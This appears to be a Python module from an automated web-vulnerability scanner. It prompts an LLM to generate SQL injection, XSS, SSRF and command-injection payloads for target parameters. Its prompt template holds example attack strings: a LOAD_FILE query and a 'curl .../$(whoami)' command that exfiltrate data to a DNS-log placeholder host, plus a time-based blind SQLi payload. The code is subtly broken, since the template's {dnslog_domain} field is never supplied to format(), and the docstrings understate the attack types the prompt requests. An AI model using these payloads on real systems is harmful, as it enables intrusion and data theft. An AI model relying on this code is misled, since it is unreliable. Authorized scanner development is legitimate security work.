"""Payload 动态生成器 — 根据攻击面调用 LLM 生成 SQLi/XSS 测试 Payload。

接入 L4 主动扫描管线：extract_attack_surface() → generate_dynamic_payloads()
"""

from __future__ import annotations

import json as _json
import logging
import re as _re

from agent.llm_client import get_llm_client

_log = logging.getLogger(__name__)

_PROMPT_TEMPLATE = """你是一个顶级的 Web 安全红队专家。现在 AegisAgent 发现了一个可疑的 200 OK 页面，以下是提取到的前端攻击面信息：

【目标 URL】: {target_url}
【发现的表单/参数】: {attack_surface_json}

请你根据上述参数的特征（例如 id 可能是数字型，username 可能是字符型），为我动态生成最适合的测试 Payload。
重点测试：SQL 注入（报错注入、盲注）、XSS（反射型）、SSRF 和 RCE。

⚠️ 无回显漏洞强制使用 OOB 占位符：
如果你生成的 Payload 属于盲打类型（Blind SQLi 时间注入、SSRF、命令注入、XXE 等无回显攻击），
必须使用 {dnslog_domain} 作为外连域名占位符。
例如: OR (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.{dnslog_domain}\\a'))) --
例如: curl http://{dnslog_domain}/$(whoami)

每个参数生成不超过 2 个高质量的验证型 Payload。

⚠️ 严格遵守以下要求：只输出合法的 JSON 数组格式，不要包含任何 markdown 标记（如 ```json）、不要有任何前言后语。
输出格式示例：
[
  {{
    "vulnerability_type": "SQLi",
    "target_parameter": "id",
    "payload": "1' AND (SELECT 8000 FROM (SELECT(SLEEP(5)))a) AND 'b'='b",
    "expected_observation": "响应时间超过 5 秒"
  }}
]"""


async def generate_dynamic_payloads(
    target_url: str,
    attack_surface: dict,
    api_key: str | None = None,
) -> list[dict]:
    """根据攻击面信息，调用 LLM 动态生成 SQLi / XSS 测试 Payload。

    Args:
        target_url: 目标 URL
        attack_surface: extract_attack_surface() 返回的 dict
        api_key: DeepSeek API Key，默认从环境变量读取

    Returns:
        [{"vulnerability_type": "SQLi|XSS", "target_parameter": str,
          "payload": str, "expected_observation": str}, ...]
    """
    surface_json = _json.dumps(attack_surface, ensure_ascii=False, indent=2)
    prompt = _PROMPT_TEMPLATE.format(
        target_url=target_url,
        attack_surface_json=surface_json,
    )

    client, model = get_llm_client(api_key=api_key)

    try:
        resp = await client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": "你只输出 JSON 数组，不输出任何其他内容。"},
                {"role": "user", "content": prompt},
            ],
            temperature=0.0,
            max_tokens=2048,
        )
    except Exception as e:
        _log.error("payload_gen_llm_failed url=%s error=%s", target_url, e)
        return []

    raw = resp.choices[0].message.content or ""

    # 容错: 尝试从 markdown 代码块中提取 JSON
    json_text = raw.strip()
    code_block = _re.search(r"```(?:json)?\s*(.*?)\s*```", json_text, _re.DOTALL)
    if code_block:
        json_text = code_block.group(1)

    # 容错: 有时 LLM 在 JSON 前后加文字
    bracket_start = json_text.find("[")
    bracket_end = json_text.rfind("]") + 1
    if bracket_start >= 0 and bracket_end > bracket_start:
        json_text = json_text[bracket_start:bracket_end]

    try:
        payloads: list[dict] = _json.loads(json_text)
    except _json.JSONDecodeError:
        _log.warning("payload_gen_json_parse_failed url=%s raw=%s",
                     target_url, raw[:300])
        return []

    _log.info("payload_gen_done url=%s count=%d", target_url, len(payloads))
    return payloads
